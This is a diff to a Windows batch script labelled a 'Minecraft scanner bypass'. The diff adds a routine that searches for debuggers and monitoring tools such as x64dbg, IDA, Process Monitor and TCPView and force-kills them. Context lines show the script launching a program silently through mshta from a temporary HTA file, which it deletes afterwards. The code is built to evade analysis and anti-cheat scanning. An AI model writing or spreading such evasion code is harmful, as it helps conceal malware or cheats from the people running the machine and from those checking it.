@@ -1,7 +1,22 @@
-
 @echo off
 :: Minecraft scanner bypass by ._rayzz! :P
 setlocal EnableDelayedExpansion
+
+:: Debuggers
+set "debuggers=ollydbg.exe x64dbg.exe x32dbg.exe cheatengine.exe ida.exe ida64.exe winhex.exe tcpview.exe processhacker.exe procmon.exe procexp.exe xdbg.exe"
+
+:check_debuggers
+for %%D in (%debuggers%) do (
+    tasklist /FI "IMAGENAME eq %%D" | find /I "%%D" >nul
+    if not errorlevel 1 (
+        echo Found debugger: %%D - Terminating...
+        taskkill /F /IM %%D >nul 2>&1
+    )
+)
+
+timeout /t 5 >nul
+
+
 
 :: === System Info ===
 set "userName=%USERNAME%"
@@ -54,8 +69,8 @@ echo [*] Launching %APP_TO_RUN% silently via mshta...
 start "" mshta.exe "%CD%\temp.hta"
 
 :: === Wait for app to initialize ===
-echo [*] Waiting 15 seconds before cleanup...
-timeout /t 15 >nul
+echo [*] Waiting 30 seconds before cleanup...
+timeout /t 30 >nul
 
 :: === Cleanup HTA ===
 del temp.hta >nul 2>&1
